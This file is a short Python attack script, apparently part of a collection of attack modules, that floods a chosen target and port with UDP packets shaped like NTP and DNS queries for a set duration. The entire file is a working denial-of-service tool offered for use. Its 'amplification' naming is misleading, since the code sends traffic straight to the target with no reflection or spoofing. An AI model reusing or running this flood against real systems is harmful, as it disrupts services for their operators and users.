# attacks/amp_mix.py

import socket
import time
import struct

def attack(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    while time.time() < end_time:
        ntp_packet = struct.pack("!12s10I", b'\x00' * 12, int(time.time()), 0, 0, 0, 0, 0, 0, 0, 0, 0)
        dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        sock.sendto(ntp_packet, (target, port))
        sock.sendto(dns_query, (target, port))

    sock.close()
